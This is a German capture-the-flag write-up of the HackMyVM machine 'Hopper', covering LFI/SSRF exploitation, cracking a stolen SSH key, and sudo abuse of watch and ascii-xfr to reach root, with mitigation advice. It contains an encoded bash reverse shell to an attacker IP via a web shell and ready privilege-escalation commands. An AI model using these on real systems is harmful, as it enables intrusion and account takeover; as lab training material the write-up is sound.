# Hopper (HackMyVM) - Penetration Test Bericht

![Hopper.png](Hopper.png)

**Datum des Berichts:** 29. August 2022  
**VM:** Hopper  
**Plattform:** HackMyVM ([Link zur VM](https://hackmyvm.eu/machines/machine.php?vm=Hopper))  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Hopper_HackMyVM_Medium/](https://alientec1908.github.io/Hopper_HackMyVM_Medium/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance & LFI/SSRF](#phase-1-reconnaissance--lfissrf)
4.  [Phase 2: Initial Access (SSH Key via SSRF)](#phase-2-initial-access-ssh-key-via-ssrf)
5.  [Phase 3: Privilege Escalation (Kette)](#phase-3-privilege-escalation-kette)
    *   [www-data zu henry (Sudo/watch)](#www-data-zu-henry-sudowatch)
    *   [henry zu root (Sudo/ascii-xfr)](#henry-zu-root-sudoascii-xfr)
6.  [Proof of Concept (Finale Root-Eskalation)](#proof-of-concept-finale-root-eskalation)
7.  [Flags](#flags)
8.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "Hopper" von HackMyVM (Schwierigkeitsgrad: Medium). Die initiale Erkundung offenbarte einen Webserver. Eine Local File Inclusion (LFI)-Schwachstelle im Skript `/advanced-search/path.php` (Parameter `path`) wurde identifiziert. Diese LFI wurde als Server-Side Request Forgery (SSRF) genutzt, um interne Ports zu scannen, wobei ein Dienst auf `127.0.0.1:2222` entdeckt wurde. Durch weiteres Directory Busting über die SSRF wurde ein Backup-Pfad (`/backup`) auf diesem internen Dienst gefunden, der einen passwortgeschützten privaten SSH-Schlüssel enthielt. Die Passphrase (`barcelona`) wurde mittels `ssh2john` und `john` geknackt, was den SSH-Zugriff als Benutzer `edward` ermöglichte.

Die Privilegieneskalation erfolgte in mehreren Schritten:
1.  **www-data zu henry:** Eine Web Shell wurde platziert (vermutlich über die LFI/SSRF oder eine andere nicht gezeigte Methode), um eine Reverse Shell als `www-data` zu erhalten. Eine `sudo`-Regel erlaubte `www-data`, `watch` als Benutzer `henry` auszuführen, was zur Erlangung einer Shell als `henry` genutzt wurde.
2.  **henry zu root:** Eine weitere `sudo`-Regel erlaubte `henry`, `ascii-xfr` (vermutlich als Root) auszuführen. Dies wurde genutzt, um `henry`'s öffentlichen SSH-Schlüssel in `/root/.ssh/authorized_keys` zu schreiben, was den direkten SSH-Login als `root` ermöglichte.

---

## Verwendete Tools

*   `arp-scan` (impliziert)
*   `vi` (impliziert für Hosts-Datei)
*   `wfuzz`
*   `curl`
*   `python3` (Script für Portscan, `http.server` für Web Shell Transfer)
*   `gobuster`
*   `chmod`
*   `ssh2john`
*   `john` (John the Ripper)
*   `ssh`
*   `wget`
*   `nc (netcat)`
*   `export` (impliziert für Shell-Variablen)
*   `sudo`
*   `watch`
*   `reset` (impliziert für Shell-Stabilisierung)
*   `sh`
*   `id`
*   `mkdir`
*   `ssh-keygen`
*   `cp`
*   `ascii-xfr`
*   `cat`

---

## Phase 1: Reconnaissance & LFI/SSRF

1.  **Netzwerk-Scan und Host-Konfiguration:**
    *   Die Ziel-IP wurde als `192.168.2.131` identifiziert.
    *   Der Hostname `hopper.vm` wurde der lokalen `/etc/hosts`-Datei hinzugefügt.

2.  **LFI-Identifizierung:**
    *   `wfuzz` wurde verwendet, um eine Local File Inclusion (LFI)-Schwachstelle im Skript `/advanced-search/path.php` über den Parameter `path` zu finden (z.B. `path.php?path=file://[DATEIPFAD]`).
    *   Die LFI wurde durch Abrufen von `/etc/passwd` bestätigt (`curl http://hopper.vm/advanced-search/path.php?path=file:///etc/passwd`), wodurch die Benutzer `root`, `edward` und `henry` identifiziert wurden.

3.  **Interner Portscan via SSRF:**
    *   Die LFI-Schwachstelle wurde als Server-Side Request Forgery (SSRF) genutzt, um interne Ports auf `127.0.0.1` zu scannen. Ein Python-Skript wurde verwendet, um Anfragen wie `path.php?path=http://127.0.0.1:[PORT]` zu senden.
    *   Dieser Scan (oder manuelle Versuche) identifizierte einen offenen Dienst auf Port `2222` (`http://127.0.0.1:2222`).

4.  **Directory Busting auf internem Dienst via SSRF:**
    *   `gobuster dir` wurde durch die SSRF getunnelt, um den Dienst auf `127.0.0.1:2222` zu enumerieren:
        ```bash
        gobuster dir -u http://hopper.vm/advanced-search/path.php?path=http://127.0.0.1:2222 -w [...]
        ```
    *   Dies führte zum Fund des Pfades `/backup` auf dem internen Dienst.

---

## Phase 2: Initial Access (SSH Key via SSRF)

1.  **Extraktion des SSH-Schlüssels:**
    *   Durch Abrufen von `http://hopper.vm/advanced-search/path.php?path=http://127.0.0.1:2222/backup` wurde ein privater SSH-Schlüssel gefunden.
    *   Der Schlüssel wurde lokal als `idid` gespeichert und die Berechtigungen auf `600` gesetzt.

2.  **Knacken der SSH-Schlüssel-Passphrase:**
    *   `ssh2john idid > idhash` extrahierte den Hash des passwortgeschützten Schlüssels.
    *   `john --wordlist=/usr/share/wordlists/rockyou.txt idhash` knackte die Passphrase: `barcelona`.

3.  **SSH-Login als `edward`:**
    *   Mit dem Schlüssel `idid` und der Passphrase `barcelona` wurde ein SSH-Login als `edward` durchgeführt:
        ```bash
        ssh -i idid edward@hopper.vm
        # Passphrase: barcelona
        ```
    *   Initialer Zugriff als `edward` wurde erlangt.

---

## Phase 3: Privilege Escalation (Kette)

### www-data zu henry (Sudo/watch)

1.  **Web Shell und Reverse Shell als `www-data`:**
    *   Eine PHP-Web-Shell (`ben.php`) wurde auf dem Server platziert (vermutlich über die LFI/SSRF-Schwachstelle oder eine andere nicht gezeigte Methode) und genutzt, um eine Reverse Shell als `www-data` zu etablieren.
        ```bash
        # Auf Angreifer-Maschine:
        # python3 -m http.server 4444 (zum Hosten der Web Shell)
        # nc -lvnp 9001 (Listener)
        # Via Browser/curl (URL-kodiert):
        # http://hopper.vm/ben.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[Angreifer-IP]%2F9001%200%3E%261%27
        ```
2.  **Sudo-Rechte-Prüfung für `www-data`:**
    *   `sudo -l` (als `www-data`) zeigte eine Regel, die es erlaubte, `watch` als Benutzer `henry` auszuführen.
3.  **Ausnutzung:**
    *   `sudo -u henry watch -x sh -c 'reset; exec sh 1>&0 2>&0'`
    *   Dies gewährte eine Shell als Benutzer `henry`. Die Shell wurde mit Python PTY stabilisiert.

### henry zu root (Sudo/ascii-xfr)

1.  **Sudo-Rechte-Prüfung für `henry`:**
    *   `sudo -l` (als `henry`) zeigte eine Regel, die es erlaubte, `ascii-xfr` (vermutlich als `root`) auszuführen.

2.  **Vorbereitung des SSH-Schlüssels:**
    *   Als `henry` wurde ein neues SSH-Schlüsselpaar generiert (Passphrase: `benni`):
        ```bash
        mkdir ~/.ssh
        cd ~/.ssh
        ssh-keygen
        cp id_rsa.pub authorized_keys
        ```

3.  **Ausnutzung von `sudo ascii-xfr`:**
    *   Der öffentliche Schlüssel von `henry` wurde in die `authorized_keys`-Datei von `root` geschrieben:
        ```bash
        sudo ascii-xfr -rv /root/.ssh/authorized_keys < authorized_keys
        ```
4.  **SSH-Login als `root`:**
    *   `ssh root@localhost -i /home/henry/.ssh/id_rsa` mit der Passphrase `benni` war erfolgreich.

---

## Proof of Concept (Finale Root-Eskalation)

**Kurzbeschreibung:** Die finale Privilegieneskalation von `henry` zu `root` erfolgte durch eine unsichere `sudo`-Regel, die `henry` erlaubte, das Programm `ascii-xfr` (vermutlich als `root`) auszuführen. Dies wurde genutzt, um den öffentlichen SSH-Schlüssel von `henry` in die Datei `/root/.ssh/authorized_keys` zu schreiben. Anschließend konnte sich `henry` per SSH als `root` am System anmelden.

**Schritte (als `henry`):**
1.  Erstelle ein SSH-Schlüsselpaar, falls nicht vorhanden:
    ```bash
    mkdir -p ~/.ssh && cd ~/.ssh
    ssh-keygen -t rsa -f id_rsa -N "benni" # Beispiel-Passphrase
    cp id_rsa.pub authorized_keys
    ```
2.  Verwende `sudo ascii-xfr`, um den öffentlichen Schlüssel zu `/root/.ssh/authorized_keys` hinzuzufügen:
    ```bash
    sudo ascii-xfr -rv /root/.ssh/authorized_keys < authorized_keys
    ```
3.  Logge dich als `root` per SSH ein:
    ```bash
    ssh root@localhost -i ~/.ssh/id_rsa
    # Gib die Passphrase "benni" ein
    ```
**Ergebnis:** Eine Shell mit `uid=0(root)` wird gestartet.

---

## Flags

*   **User Flag (`/home/edward/user.txt` - Pfad angenommen):**
    *   Die User-Flagge wurde im Original-Log nicht explizit gezeigt.
*   **Root Flag (`/root/root.txt` - Pfad angenommen):**
    *   Die Root-Flagge wurde im Original-Log nicht explizit gezeigt.

---

## Empfohlene Maßnahmen (Mitigation)

*   **Webanwendungssicherheit (LFI/SSRF):**
    *   **DRINGEND:** Beheben Sie die Local File Inclusion (LFI)-Schwachstelle in `/advanced-search/path.php`. Alle Benutzereingaben (insbesondere Dateipfade und URLs) müssen strikt validiert und saniert werden. Verwenden Sie Whitelisting für erlaubte Pfade/Protokolle.
    *   Beschränken Sie die Fähigkeit des Webservers, ausgehende Netzwerkverbindungen zu beliebigen internen oder externen Adressen herzustellen (SSRF-Mitigation).
*   **Sicherung interner Dienste:**
    *   Interne Dienste (wie der auf `127.0.0.1:2222`) sollten angemessen gesichert sein und keine sensiblen Daten (wie Backups mit privaten Schlüsseln) preisgeben.
*   **SSH-Schlüssel-Management:**
    *   Private SSH-Schlüssel dürfen **niemals** in zugänglichen Backups oder über unsichere Kanäle exponiert werden.
    *   Erzwingen Sie starke, einzigartige Passphrasen für alle SSH-Schlüssel.
*   **Sudo-Konfiguration:**
    *   **DRINGEND:** Überprüfen und härten Sie alle `sudo`-Regeln.
        *   Entfernen Sie die Regel, die `www-data` erlaubt, `watch` als `henry` auszuführen.
        *   Entfernen Sie die Regel, die `henry` erlaubt, `ascii-xfr` als `root` auszuführen.
    *   Gewähren Sie `sudo`-Rechte nur nach dem Prinzip der geringsten Rechte. Vermeiden Sie es, Benutzern die Ausführung von Tools zu erlauben, die zur Befehlsausführung oder Dateimanipulation missbraucht werden können.
*   **Webserver-Sicherheit:**
    *   Verhindern Sie das Hochladen und Ausführen von Web Shells durch korrekte Dateiberechtigungen im Web-Root und ggf. durch den Einsatz von Web Application Firewalls (WAFs).
*   **Allgemeine Systemhärtung:**
    *   Überwachen Sie SSH-Logins und Systemprozesse auf verdächtige Aktivitäten.
    *   Führen Sie regelmäßige Sicherheitsaudits durch.

---

**Ben C. - Cyber Security Reports**
